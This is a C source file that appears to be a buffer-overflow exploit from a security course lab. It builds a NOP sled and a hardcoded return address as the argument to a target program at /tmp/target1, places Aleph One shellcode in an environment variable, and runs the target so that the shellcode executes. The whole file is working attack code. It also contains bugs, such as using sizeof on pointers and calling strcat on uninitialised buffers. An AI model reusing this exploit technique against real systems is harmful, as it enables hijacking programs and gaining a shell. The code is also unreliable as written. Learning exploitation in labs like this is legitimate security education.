#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

char *repeat(char *s, int x)
{
  //from https://stackoverflow.com/a/22599676/5552894
  char *result = malloc(sizeof(s) * x + 1);
  while (x > 0) {
      strcat(result, s);
      x --;
  }
  return result;
}

int main(void)
{
  char *args[3]; 
  char *env[1];

  char *noop = "\x90";
  int sled_length = 8;
   //bfffff9f
  char *address = "\x9f\xff\xff\xbf";
  char *result = malloc(sizeof(noop)*sled_length + sizeof(address) + 1);
  char *result1 = repeat(noop, sled_length);
  strcat(result, result1);
  strcat(result, address);
  char *preface = "shellcode=";
  char *envvar = malloc(sizeof(preface)+sizeof(shellcodeAlephOne)+1);
  strcat(envvar, preface);
  strcat(envvar, shellcodeAlephOne);
  args[0] = TARGET;
  args[1] = result;
  args[2] = NULL;
  
  env[0] = envvar;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


